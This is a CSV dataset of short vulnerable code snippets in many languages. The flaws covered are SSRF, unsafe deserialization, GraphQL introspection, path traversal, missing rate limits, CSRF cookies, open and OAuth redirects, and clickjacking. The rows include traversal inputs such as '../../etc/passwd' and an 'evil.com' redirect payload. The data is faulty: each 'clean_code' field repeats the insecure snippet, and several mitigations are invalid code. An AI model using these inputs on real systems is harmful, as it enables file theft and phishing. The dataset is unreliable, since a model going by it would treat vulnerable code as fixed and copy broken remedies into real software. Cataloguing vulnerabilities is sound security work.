id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-451,Rust,Server-Side Request Forgery,Fetching unvalidated URLs.,"let resp = reqwest::get(&req.query(""url"")?).await?;",Request internal resources.,"Validate: if url.starts_with(""https://allowed.com"") { reqwest::get(url) }","let resp = reqwest::get(&req.query(""url"")?).await?;",True,True,False,False,51,False,True,False,Other,1
vuln-452,Elixir,Server-Side Request Forgery,Unvalidated URL fetching.,"{:ok, _} = HTTPoison.get(params[""url""])",Access internal endpoints.,"Validate: if String.starts_with?(url, ""https://allowed.com"") do HTTPoison.get(url) end","{:ok, _} = HTTPoison.get(params[""url""])",True,False,False,False,39,False,True,False,Other,1
vuln-453,Perl,Server-Side Request Forgery,Fetching unvalidated URLs.,my $response = LWP::UserAgent->new->get($r->param('url'));,Request internal services.,Validate: $ua->get($url) if grep { $url =~ /^$_/ } @allowed;,my $response = LWP::UserAgent->new->get($r->param('url'));,True,False,False,False,58,False,True,False,Other,1
vuln-454,Node.js,Insecure Deserialization,Deserializing untrusted data with node-serialize.,const serialize = require('node-serialize'); serialize.unserialize(userInput);,Inject malicious serialized objects for RCE.,Avoid deserialization; use JSON.parse with validation.,const serialize = require(); serialize.unserialize(userInput);,True,False,False,False,78,False,True,False,Other,1
vuln-455,Python,Insecure Deserialization,Using pickle for untrusted data.,import pickle; obj = pickle.loads(request.data),Craft pickle payload for RCE.,Use JSON or YAML.safe_load; avoid pickle.,import pickle; obj = pickle.loads(request.data),False,False,False,False,47,False,False,False,Other,1
vuln-456,Java,Insecure Deserialization,Deserializing untrusted data with ObjectInputStream.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,Inject gadget chains for RCE.,Use ObjectInputFilter; whitelist classes.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,True,False,False,False,96,False,False,False,Other,1
vuln-457,PHP,Insecure Deserialization,Unserializing untrusted data.,$obj = unserialize($_POST['data']);,Inject malicious serialized objects.,Avoid unserialize; use JSON or safe formats.,$obj = unserialize($_POST['data']);,False,False,False,False,35,False,True,False,Other,1
vuln-458,Ruby,Insecure Deserialization,Using Marshal.load on untrusted data.,obj = Marshal.load(user_input),Craft malicious payload for RCE.,Use JSON; avoid Marshal.load on user input.,obj = Marshal.load(user_input),True,False,False,False,30,False,False,False,Other,1
vuln-459,Go,Insecure Deserialization,Decoding untrusted gob data.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,Inject malicious gob data.,Use JSON or safe formats; avoid gob for user input.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,False,False,False,False,71,False,False,False,Other,1
vuln-460,C# (.NET),Insecure Deserialization,Using BinaryFormatter on untrusted data.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,Inject malicious serialized objects.,Use JsonSerializer; avoid BinaryFormatter.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,False,False,False,False,67,False,False,False,Other,1
vuln-461,Kotlin,Insecure Deserialization,Deserializing untrusted data.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),Craft malicious objects for RCE.,Use JSON or safe formats; avoid ObjectInputStream.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),True,False,False,False,83,False,False,False,Other,1
vuln-462,Scala,Insecure Deserialization,Deserializing untrusted Java objects.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),Inject gadget chains for RCE.,Use JSON; avoid ObjectInputStream for user data.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),True,False,False,False,81,False,False,False,Other,1
vuln-463,Rust,Insecure Deserialization,Using serde with untrusted data.,let obj: T = serde_json::from_str(&user_input)?;,Inject malicious JSON to manipulate structs.,Validate JSON schema; use strict typing.,let obj: T = serde_json::from_str(&user_input)?;,True,False,False,False,48,False,False,False,Other,1
vuln-464,Elixir,Insecure Deserialization,Using :erlang.binary_to_term on untrusted data.,obj = :erlang.binary_to_term(user_input),Craft malicious terms for RCE.,Use Jason.decode!; avoid binary_to_term.,obj = :erlang.binary_to_term(user_input),True,False,False,False,40,False,False,False,Other,1
vuln-465,Perl,Insecure Deserialization,Using Storable::thaw on untrusted data.,use Storable qw(thaw); my $obj = thaw($user_input);,Inject malicious serialized data.,Use JSON::XS; avoid Storable for user input.,use Storable qw(thaw); my $obj = thaw($user_input);,True,False,False,False,51,False,False,False,Other,1
vuln-466,Node.js,Insecure GraphQL Introspection,Exposing GraphQL introspection queries.,"const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",Query schema to map API and craft attacks.,"Disable introspection: graphqlHTTP({ schema, introspection: false })","const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",False,False,False,False,83,False,True,False,Other,1
vuln-467,Python,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",Extract schema to plan attacks.,"Disable introspection: schema = graphene.Schema(query=Query, auto_camelcase=False, introspection=False)","schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",True,True,False,False,124,False,True,False,Other,1
vuln-468,Java,Insecure GraphQL Introspection,Exposing GraphQL schema introspection.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },Query schema to discover endpoints.,Disable introspection in GraphQL configuration.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },True,True,False,False,98,False,False,False,Other,1
vuln-469,PHP,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",Map schema to craft targeted queries.,Disable introspection: $schema->disableIntrospection(),"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",True,True,False,True,105,False,True,False,Other,1
vuln-470,Ruby,Insecure GraphQL Introspection,Exposing GraphQL introspection.,class MySchema < GraphQL::Schema; query Types::Query; end,Query schema to extract API details.,Disable: class MySchema < GraphQL::Schema; query Types::Query; introspection false; end,class MySchema < GraphQL::Schema; query Types::Query; end,True,True,False,False,57,False,False,False,Other,1
vuln-471,Go,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",Extract schema to plan attacks.,Disable introspection in gqlgen configuration.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",True,True,False,False,70,False,False,False,Other,1
vuln-472,C# (.NET),Insecure GraphQL Introspection,Exposing GraphQL introspection.,services.AddGraphQL().AddSchema<MySchema>();,Query schema to map API.,Disable: AddGraphQL().AddSchema<MySchema>().DisableIntrospection(),services.AddGraphQL().AddSchema<MySchema>();,False,False,False,False,44,False,False,False,Other,1
vuln-473,Kotlin,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,graphql { schema { query = Query::class } },Extract schema for attack planning.,Disable introspection in GraphQL-Kotlin config.,graphql { schema { query = Query::class } },True,True,False,False,43,False,False,False,Other,1
vuln-474,Scala,Insecure GraphQL Introspection,Exposing GraphQL introspection.,"SchemaDefinition(queries = List(Field(""query"", ...)))",Query schema to discover endpoints.,Disable introspection in Sangria configuration.,"SchemaDefinition(queries = List(Field(""query"", ...)))",True,True,False,False,53,False,True,False,Other,1
vuln-475,Rust,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",Map schema to craft attacks.,Disable introspection in Juniper configuration.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",True,True,False,False,77,False,False,False,Other,1
vuln-476,Elixir,Insecure GraphQL Introspection,Exposing GraphQL introspection.,schema do query do ... end end,Query schema to extract API details.,Disable: Absinthe.Schema.introspection(false),schema do query do ... end end,True,True,False,False,30,False,False,False,Other,1
vuln-477,Perl,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,my $schema = GraphQL::Schema->new(query => $query);,Extract schema to plan attacks.,Disable introspection in GraphQL::Perl config.,my $schema = GraphQL::Schema->new(query => $query);,True,True,False,False,51,False,False,False,Other,1
vuln-478,Node.js,Path Traversal,Unvalidated file path access.,"fs.readFileSync(path.join('public', req.query.file))",Access: ../../etc/passwd,"Validate: path.resolve('public', file).startsWith(process.cwd() + '/public')","fs.readFileSync(path.join('public', req.query.file))",True,True,True,False,52,False,True,False,File_Handling,1
vuln-479,Python,Path Traversal,Unvalidated file path in file read.,"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",Access: ../../etc/passwd,Validate: os.path.realpath(path).startswith(os.path.realpath('public')),"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",False,False,True,False,81,False,True,False,File_Handling,1
vuln-480,Java,Path Traversal,Unvalidated file path access.,"Files.readString(Paths.get(""public"", request.getParameter(""file"")));",Access: ../../etc/passwd,"Validate: Paths.get('public', file).normalize().startsWith(Paths.get('public'))","Files.readString(Paths.get(""public"", request.getParameter(""file"")));",True,False,False,False,68,False,True,False,File_Handling,1
vuln-481,PHP,Path Traversal,Unvalidated file path in read.,readfile('public/' . $_GET['file']);,Access: ../../etc/passwd,Validate: realpath('public/' . $file) starts with base dir.,readfile('public/' . $_GET['file']);,False,False,True,False,36,False,True,False,File_Handling,1
vuln-482,Ruby,Path Traversal,Unvalidated file path access.,"File.read(File.join('public', params[:file]))",Access: ../../etc/passwd,"Validate: File.expand_path(file, 'public').start_with?(Dir.pwd + '/public')","File.read(File.join('public', params[:file]))",True,False,False,False,45,False,True,False,File_Handling,1
vuln-483,Go,Path Traversal,Unvalidated file path in read.,"data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",Access: ../../etc/passwd,"Validate: filepath.Clean(path).HasPrefix(""public"")","data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",True,True,True,False,74,False,True,False,File_Handling,1
vuln-484,C# (.NET),Path Traversal,Unvalidated file path access.,"File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",Access: ../../web.config,"Validate: Path.GetFullPath(path).StartsWith(Path.GetFullPath(""public""))","File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",True,True,False,False,63,False,True,False,File_Handling,1
vuln-485,Kotlin,Path Traversal,Unvalidated file path in read.,"File(""public/${call.request.queryParameters[""file""]}"").readText()",Access: ../../etc/passwd,"Validate: File(baseDir, file).canonicalPath.startsWith(baseDir.canonicalPath)","File(""public/${call.request.queryParameters[""file""]}"").readText()",True,True,False,False,65,False,True,True,File_Handling,1
vuln-486,Scala,Path Traversal,Unvalidated file path access.,"scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",Access: ../../etc/passwd,"Validate: new File(baseDir, file).getCanonicalPath.startsWith(baseDir)","scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",True,False,False,False,62,False,True,True,File_Handling,1
vuln-487,Rust,Path Traversal,Unvalidated file path in read.,"fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",Access: ../../etc/passwd,"Validate: path.canonicalize()?.starts_with(Path::new(""public"").canonicalize()?)","fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",True,True,False,False,65,False,True,False,File_Handling,1
vuln-488,Elixir,Path Traversal,Unvalidated file path access.,"File.read!(""public/"" <> params[""file""])",Access: ../../etc/passwd,"Validate: Path.expand(file, ""public"") |> String.starts_with?(""public"")","File.read!(""public/"" <> params[""file""])",True,False,False,False,39,False,True,False,File_Handling,1
vuln-489,Perl,Path Traversal,Unvalidated file path in read.,"open(my $fh, '<', ""public/$filename"");",Access: ../../etc/passwd,"Validate: realpath(""public/$filename"") =~ /^$base_dir/","open(my $fh, '<', ""public/$filename"");",False,False,True,False,38,False,True,False,File_Handling,1
vuln-490,Node.js,Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"app.post('/login', (req, res) => authenticate(req.body));",Brute force login attempts.,"Use express-rate-limit: app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))","app.post('/login', (req, res) => authenticate(req.body));",True,False,False,False,57,False,True,False,Other,1
vuln-491,Python,Insecure Rate Limiting,No rate limiting on authentication.,"@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",Brute force credentials.,"Use Flask-Limiter: limiter.limit(""5 per minute"")(login)","@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",False,False,False,False,78,False,True,False,Other,1
vuln-492,Java,Insecure Rate Limiting,No rate limiting on login endpoint.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",Brute force login attempts.,Use Spring Security rate limiting or custom filter.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-493,PHP,Insecure Rate Limiting,No rate limiting on sensitive routes.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },Brute force credentials.,Use rate limiting middleware like throttle.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },False,False,False,False,108,False,True,False,Other,1
vuln-494,Ruby,Insecure Rate Limiting,No rate limiting on authentication.,post '/login' do authenticate(params) end,Brute force login attempts.,"Use rack-attack: Rack::Attack.throttle('logins/ip', limit: 5, period: 60)",post '/login' do authenticate(params) end,True,False,False,False,41,False,True,False,Other,1
vuln-495,Go,Insecure Rate Limiting,No rate limiting on login endpoint.,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",Brute force credentials.,Use rate limiter: github.com/ulule/limiter,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",False,False,False,False,91,False,True,False,Other,1
vuln-496,C# (.NET),Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",Brute force login attempts.,Use AspNetCoreRateLimit: services.AddRateLimiting(),"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-497,Kotlin,Insecure Rate Limiting,No rate limiting on authentication.,"post(""/login"") { authenticate(call.request.receive()) }",Brute force credentials.,Use Ktor rate limiting plugin: install(RateLimit) { limit = 5; period = 60.seconds },"post(""/login"") { authenticate(call.request.receive()) }",False,False,False,False,55,False,True,False,Other,1
vuln-498,Scala,Insecure Rate Limiting,No rate limiting on login endpoint.,"post(""/login"") { authenticate(params.as[Credentials]) }",Brute force login attempts.,"Use Play filters: add RateLimitFilter(limit = 5, window = 60.seconds)","post(""/login"") { authenticate(params.as[Credentials]) }",True,False,False,False,55,False,True,False,Other,1
vuln-499,Rust,Insecure Rate Limiting,No rate limiting on sensitive routes.,"router.post(""/login"", |req| authenticate(req.body()?))",Brute force credentials.,Use actix-web middleware for rate limiting.,"router.post(""/login"", |req| authenticate(req.body()?))",True,False,False,False,54,False,True,False,Other,1
vuln-500,Elixir,Insecure Rate Limiting,No rate limiting on authentication.,"post ""/login"", AuthController, :login",Brute force login attempts.,"Use Plug.RateLimit: plug :rate_limit, max: 5, interval: 60_000","post ""/login"", AuthController, :login",False,False,False,False,37,False,True,False,Other,1
vuln-501,Perl,Insecure Rate Limiting,No rate limiting on authentication endpoints.,if ($r->uri eq '/login') { authenticate($r->param('user')); },Brute force credentials via rapid requests.,"Implement rate limiting: use Apache::Throttle; throttle('login', 5, 60);",if ($r->uri eq '/login') { authenticate($r->param('user')); },True,False,False,False,61,False,True,False,Other,1
vuln-502,Node.js,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without validation.,"res.cookie('csrf_token', token); app.post('/action', verifyCsrf);",Forge CSRF tokens via cookie manipulation.,Store tokens server-side; use csurf middleware with session validation.,"res.cookie('csrf_token', token); app.post('/action', verifyCsrf);",False,False,False,False,65,False,True,False,Authentication,1
vuln-503,Python,Insecure CSRF Token Storage,CSRF tokens stored in cookies without server-side checks.,"response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])",Manipulate CSRF cookie to bypass protection.,Use Flask-WTF with server-side token validation.,"response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])",False,False,False,False,81,False,True,False,Authentication,1
vuln-504,Java,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without validation.,"response.addCookie(new Cookie(""csrf_token"", token));",Forge CSRF tokens via cookie injection.,Use Spring Security CSRF protection with server-side token storage.,"response.addCookie(new Cookie(""csrf_token"", token));",False,False,False,False,52,False,True,False,Authentication,1
vuln-505,PHP,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side checks.,"setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }",Manipulate CSRF cookie to bypass checks.,Store tokens in session: $_SESSION['csrf_token'] = $token;,"setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }",False,False,False,False,87,False,True,False,Authentication,1
vuln-506,Ruby,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,cookies[:csrf_token] = token; verify_authenticity_token,Forge CSRF tokens via cookie manipulation.,Use Rails protect_from_forgery with session-based tokens.,cookies[:csrf_token] = token; verify_authenticity_token,False,False,False,False,55,False,False,False,Authentication,1
vuln-507,Go,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without server-side validation.,"http.SetCookie(w, &http.Cookie{Name: ""csrf_token"", Value: token});",Manipulate CSRF cookie to bypass checks.,Store tokens server-side; use gorilla/csrf middleware.,"http.SetCookie(w, &http.Cookie{Name: ""csrf_token"", Value: token});",False,False,False,False,66,False,True,False,Authentication,1
vuln-508,C# (.NET),Insecure CSRF Token Storage,CSRF tokens in cookies without validation.,"Response.Cookies.Append(""csrf_token"", token);",Forge CSRF tokens via cookies.,Use AntiForgeryToken with server-side validation.,"Response.Cookies.Append(""csrf_token"", token);",False,False,False,False,45,False,True,False,Authentication,1
vuln-509,Kotlin,Insecure CSRF Token Storage,CSRF tokens stored in cookies without checks.,"call.response.cookies.append(""csrf_token"", token)",Manipulate CSRF cookie to bypass protection.,Use Ktor CSRF protection with session-based tokens.,"call.response.cookies.append(""csrf_token"", token)",False,False,False,False,49,False,True,False,Authentication,1
vuln-510,Scala,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side validation.,"Ok.withCookies(Cookie(""csrf_token"", token))",Forge CSRF tokens via cookie injection.,Use Play Framework CSRF filter with session storage.,"Ok.withCookies(Cookie(""csrf_token"", token))",False,False,False,False,43,False,True,False,Authentication,1
vuln-511,Rust,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,"res.cookie(Cookie::new(""csrf_token"", token))",Manipulate CSRF cookie to bypass checks.,Use actix-web CSRF middleware with server-side tokens.,"res.cookie(Cookie::new(""csrf_token"", token))",False,False,False,False,44,False,True,False,Authentication,1
vuln-512,Elixir,Insecure CSRF Token Storage,CSRF tokens in cookies without server-side checks.,"put_resp_cookie(conn, ""csrf_token"", token)",Forge CSRF tokens via cookies.,Use Plug.CSRFProtection with session-based tokens.,"put_resp_cookie(conn, ""csrf_token"", token)",False,False,False,False,42,False,True,False,Authentication,1
vuln-513,Perl,Insecure CSRF Token Storage,CSRF tokens stored in cookies without validation.,"$r->headers_out->set('Set-Cookie' => ""csrf_token=$token"");",Manipulate CSRF cookie to bypass checks.,Store tokens in session; validate server-side.,"$r->headers_out->set('Set-Cookie' => ""csrf_token=$token"");",False,False,False,False,58,False,True,False,Authentication,1
vuln-515,Python,Open Redirect,Unvalidated redirect URLs.,return redirect(request.args.get('url')),Redirect to phishing site: ?url=http://evil.com,Validate: if urlparse(url).netloc == 'mydomain.com': redirect(url),return redirect(request.args.get('url')),False,False,False,False,40,False,True,False,Other,1
vuln-516,Java,Open Redirect,Unvalidated redirect URLs.,"response.sendRedirect(request.getParameter(""url""));",Redirect to malicious site.,Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost())) sendRedirect(url),"response.sendRedirect(request.getParameter(""url""));",True,False,False,False,51,False,True,False,Other,1
vuln-517,PHP,Open Redirect,Unvalidated redirect URLs.,header('Location: ' . $_GET['url']);,Redirect to phishing site.,"Validate: if (parse_url($url, PHP_URL_HOST) === 'mydomain.com') header('Location: ' . $url);",header('Location: ' . $_GET['url']);,False,False,False,False,36,False,True,False,Other,1
vuln-518,Ruby,Open Redirect,Unvalidated redirect URLs.,redirect_to params[:url],Redirect to malicious site.,Validate: redirect_to url if URI(url).host == 'mydomain.com',redirect_to params[:url],True,False,False,False,24,False,False,False,Other,1
vuln-519,Go,Open Redirect,Unvalidated redirect URLs.,"http.Redirect(w, r, r.URL.Query().Get(""url""), http.StatusFound)",Redirect to phishing site.,"Validate: if strings.HasPrefix(url, ""https://mydomain.com"") { http.Redirect(w, r, url, http.StatusFound) }","http.Redirect(w, r, r.URL.Query().Get(""url""), http.StatusFound)",True,True,False,False,63,False,True,False,Other,1
vuln-520,C# (.NET),Open Redirect,Unvalidated redirect URLs.,"return Redirect(Request.Query[""url""]);",Redirect to malicious site.,"Validate: if (new Uri(url).Host == ""mydomain.com"") return Redirect(url);","return Redirect(Request.Query[""url""]);",True,True,False,False,38,False,True,False,Other,1
vuln-521,Kotlin,Open Redirect,Unvalidated redirect URLs.,"call.respondRedirect(call.request.queryParameters[""url""]!!)",Redirect to phishing site.,"Validate: if (url.host == ""mydomain.com"") call.respondRedirect(url)","call.respondRedirect(call.request.queryParameters[""url""]!!)",True,True,False,False,59,False,True,False,Other,1
vuln-522,Scala,Open Redirect,Unvalidated redirect URLs.,"Redirect(params(""url""))",Redirect to malicious site.,"Validate: if (new URL(url).getHost == ""mydomain.com"") Redirect(url)","Redirect(params(""url""))",True,False,False,False,23,False,True,False,Other,1
vuln-523,Rust,Open Redirect,Unvalidated redirect URLs.,"res.redirect(&req.query(""url"")?)",Redirect to phishing site.,"Validate: if url.starts_with(""https://mydomain.com"") { res.redirect(url) }","res.redirect(&req.query(""url"")?)",True,True,False,False,32,False,True,False,Other,1
vuln-524,Elixir,Open Redirect,Unvalidated redirect URLs.,"redirect conn, external: params[""url""]",Redirect to malicious site.,"Validate: if String.starts_with?(url, ""https://mydomain.com"") do redirect conn, external: url end","redirect conn, external: params[""url""]",True,False,False,False,38,False,True,False,Other,1
vuln-526,Node.js,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);,Redirect to malicious OAuth handler.,Validate: if (ALLOWED_REDIRECTS.includes(redirectUri)) res.redirect(redirectUri),const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);,True,True,False,False,70,False,False,False,Authentication,1
vuln-527,Python,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,return redirect(request.args.get('redirect_uri')),Steal OAuth tokens via malicious redirect.,Validate: if redirect_uri in ALLOWED_REDIRECTS: redirect(redirect_uri),return redirect(request.args.get('redirect_uri')),False,False,False,False,49,False,True,False,Authentication,1
vuln-528,Java,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"response.sendRedirect(request.getParameter(""redirect_uri""));",Redirect OAuth flow to attacker-controlled site.,Validate: if (ALLOWED_REDIRECTS.contains(url)) sendRedirect(url),"response.sendRedirect(request.getParameter(""redirect_uri""));",True,False,False,False,60,False,True,False,Authentication,1
vuln-529,PHP,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,header('Location: ' . $_GET['redirect_uri']);,Steal tokens via malicious redirect.,"Validate: if (in_array($redirect_uri, $allowed)) header('Location: ' . $redirect_uri);",header('Location: ' . $_GET['redirect_uri']);,False,False,False,False,45,False,True,False,Authentication,1
vuln-530,Ruby,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,redirect_to params[:redirect_uri],Redirect to malicious OAuth handler.,Validate: redirect_to redirect_uri if ALLOWED_REDIRECTS.include?(redirect_uri),redirect_to params[:redirect_uri],True,False,False,False,33,False,False,False,Authentication,1
vuln-531,Go,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"http.Redirect(w, r, r.URL.Query().Get(""redirect_uri""), http.StatusFound)",Steal OAuth tokens via redirect.,"Validate: if slices.Contains(ALLOWED_REDIRECTS, url) { http.Redirect(w, r, url, http.StatusFound) }","http.Redirect(w, r, r.URL.Query().Get(""redirect_uri""), http.StatusFound)",True,True,False,False,72,False,True,False,Authentication,1
vuln-532,C# (.NET),Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"return Redirect(Request.Query[""redirect_uri""]);",Redirect to attacker-controlled site.,Validate: if (ALLOWED_REDIRECTS.Contains(url)) return Redirect(url);,"return Redirect(Request.Query[""redirect_uri""]);",True,True,False,False,47,False,True,False,Authentication,1
vuln-533,Kotlin,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"call.respondRedirect(call.request.queryParameters[""redirect_uri""]!!)",Steal tokens via malicious redirect.,Validate: if (ALLOWED_REDIRECTS.contains(url)) call.respondRedirect(url),"call.respondRedirect(call.request.queryParameters[""redirect_uri""]!!)",True,True,False,False,68,False,True,False,Authentication,1
vuln-534,Scala,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"Redirect(params(""redirect_uri""))",Redirect OAuth flow to malicious site.,Validate: if (ALLOWED_REDIRECTS.contains(url)) Redirect(url),"Redirect(params(""redirect_uri""))",True,False,False,False,32,False,True,False,Authentication,1
vuln-535,Rust,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"res.redirect(&req.query(""redirect_uri"")?)",Steal tokens via redirect.,Validate: if ALLOWED_REDIRECTS.contains(&url) { res.redirect(url) },"res.redirect(&req.query(""redirect_uri"")?)",True,True,False,False,41,False,True,False,Authentication,1
vuln-536,Elixir,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,"redirect conn, external: params[""redirect_uri""]",Redirect to malicious OAuth handler.,"Validate: if Enum.member?(ALLOWED_REDIRECTS, url) do redirect conn, external: url end","redirect conn, external: params[""redirect_uri""]",True,False,False,False,47,False,True,False,Authentication,1
vuln-537,Perl,Insecure OAuth Redirect,Unvalidated OAuth redirect URIs.,$r->headers_out->set('Location' => $r->param('redirect_uri'));,Steal OAuth tokens via redirect.,Validate: $r->headers_out->set('Location' => $url) if grep { $url eq $_ } @allowed;,$r->headers_out->set('Location' => $r->param('redirect_uri'));,True,False,False,False,62,False,True,False,Authentication,1
vuln-538,Node.js,Clickjacking,Missing X-Frame-Options header.,"app.get('/', (req, res) => res.send('Page'));",Embed site in iframe to perform clickjacking.,"Set header: res.set('X-Frame-Options', 'DENY')","app.get('/', (req, res) => res.send('Page'));",False,False,False,False,45,False,True,False,Other,1
vuln-539,Python,Clickjacking,No X-Frame-Options header.,@app.route('/') def index(): return 'Page',Iframe site for clickjacking attacks.,Set: response.headers['X-Frame-Options'] = 'DENY',@app.route('/') def index(): return 'Page',False,False,False,False,42,False,True,False,Other,1
vuln-540,Java,Clickjacking,Missing X-Frame-Options header.,"@GetMapping(""/"") public String index() { return ""Page""; }",Embed in iframe for clickjacking.,"Set: response.setHeader(""X-Frame-Options"", ""DENY"")","@GetMapping(""/"") public String index() { return ""Page""; }",False,False,False,False,57,False,True,False,Other,1
vuln-541,PHP,Clickjacking,No X-Frame-Options header.,echo 'Page';,Iframe site to perform clickjacking.,Set: header('X-Frame-Options: DENY');,echo 'Page';,False,False,False,False,12,False,True,False,Other,1
